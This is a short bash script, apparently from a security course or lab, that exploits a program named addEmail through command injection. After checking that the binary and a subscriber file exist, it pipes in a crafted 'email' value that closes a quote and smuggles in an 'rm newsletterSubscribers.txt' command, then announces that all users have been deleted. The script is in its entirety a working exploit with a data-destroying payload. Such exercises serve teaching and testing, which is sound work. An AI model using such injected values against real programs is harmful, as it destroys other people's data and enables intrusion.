#!/bin/bash

#Ensure the vulnerable program is compiled and present
if [ ! -f ./addEmail ]; then
    echo "Error: Vulnerable program not found. Compile it first."
    exit 1
fi

if [ ! -f ./newsletterSubscribers.txt ]; then
    echo "validEmail@ucalgary.ca"  | ./addEmail
    echo "newsletterSubscribers.txt wasn't created yet. Try again."
    exit 1
fi

#Takes advantage of a permissive regex and injects shell code to wipe out the list of all subscribed users
echo "\" ; rm newsletterSubscribers.txt; echo @a"  | ./addEmail 

if [ ! -f ./newsletterSubscribers.txt ]; then
    echo "All users have been deleted!"
    exit 1
fi
